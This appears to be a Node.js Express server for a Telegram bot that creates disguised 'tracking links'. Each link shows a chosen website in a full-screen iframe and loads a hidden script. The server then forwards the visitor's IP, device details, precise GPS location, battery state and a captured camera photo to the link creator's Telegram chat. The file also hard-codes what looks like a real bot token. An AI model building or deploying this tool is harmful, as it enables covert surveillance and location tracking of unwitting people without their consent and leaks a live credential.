import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import FormData from "form-data";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

const BOT_TOKEN = "8975100574:AAFDFQFAdjPUPQiOsfz4ecgTeVPTp_gN-jc";
const ADMIN_ID = 8111461057;

const DB_FILE = "./database.json";

// ===== DB =====
function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, "{}");
  }
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function generateId() {
  return Math.random().toString(36).substring(2, 8);
}

// ===== HOME =====
app.get("/", (req, res) => {
  res.send("Bot Running 🚀");
});

// ===== TRACK PAGE =====
app.get("/t/:id", (req, res) => {
  const trackingId = req.params.id;
  const db = loadDB();
  const entry = db[trackingId];

  if (!entry) return res.send("Invalid Link");

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html,body{margin:0;height:100%;overflow:hidden}
iframe{width:100%;height:100%;border:none}
</style>
</head>
<body>

<iframe src="${entry.targetUrl}"></iframe>

<script
data-tracking-id="${trackingId}"
data-server-url="https://https://zs-trace.onrender.com"
src="/script.js"></script>

</body>
</html>
`);
});

// ===== DATA (MATCH YOUR SCRIPT.JS) =====
app.post("/data", async (req, res) => {
  const trackingId = req.query.trackingId;
  const data = req.body;

  const db = loadDB();
  const entry = db[trackingId];

  if (!entry) return res.sendStatus(404);

  const chatId = entry.owner;

  try {
    const msg = `
📡 NEW VISITOR

🌍 IP: ${data.IP_Address}
📱 Device: ${data.Device_Model}
🌐 Browser: ${data.User_Agent}
🗣 Language: ${data.Language}
📺 Screen: ${data.Screen_Resolution}
🕒 Timezone: ${data.Timezone}

📍 Location:
${typeof data.Location === "object"
  ? `Lat: ${data.Location.Latitude}
Lon: ${data.Location.Longitude}
Map: ${data.Location.Google_Maps}`
  : data.Location}

🔋 Battery: ${data.Battery?.Level || "N/A"}
⚡ Charging: ${data.Battery?.Charging || "N/A"}
`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg
      })
    });

  } catch (e) {
    console.log(e);
  }

  res.sendStatus(200);
});

// ===== PHOTO =====
app.post("/photo", async (req, res) => {
  const trackingId = req.query.trackingId;

  const db = loadDB();
  const entry = db[trackingId];
  if (!entry) return res.sendStatus(404);

  const chatId = entry.owner;

  try {
    const { imageData } = req.body;

    const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");

    const filePath = path.join(__dirname, `photo_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", fs.createReadStream(filePath));

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    fs.unlinkSync(filePath);

    res.json({ success: true });

  } catch (err) {
    console.log(err);
    res.status(500).json({ success: false });
  }
});

// ===== TELEGRAM WEBHOOK =====
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {

  const msg = req.body.message;
  if (!msg) return res.sendStatus(200);

  const chatId = msg.chat.id;
  const text = msg.text || "";

  const db = loadDB();

  if (text === "/start") {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: "👋 Welcome!\n\nUse /create to generate tracking link"
      })
    });
  }

  else if (text === "/create") {
    db[chatId] = { waiting: true };
    saveDB(db);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: "Send target URL"
      })
    });
  }

  else if (db[chatId]?.waiting) {
    const id = generateId();

    db[id] = {
      owner: chatId,
      targetUrl: text
    };

    db[chatId].waiting = false;
    saveDB(db);

    const link = `https://YOUR-RENDER-URL.onrender.com/t/${id}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: `✅ Link Created:\n${link}`
      })
    });
  }

  res.sendStatus(200);
});

// ===== START =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server Running 🚀");
});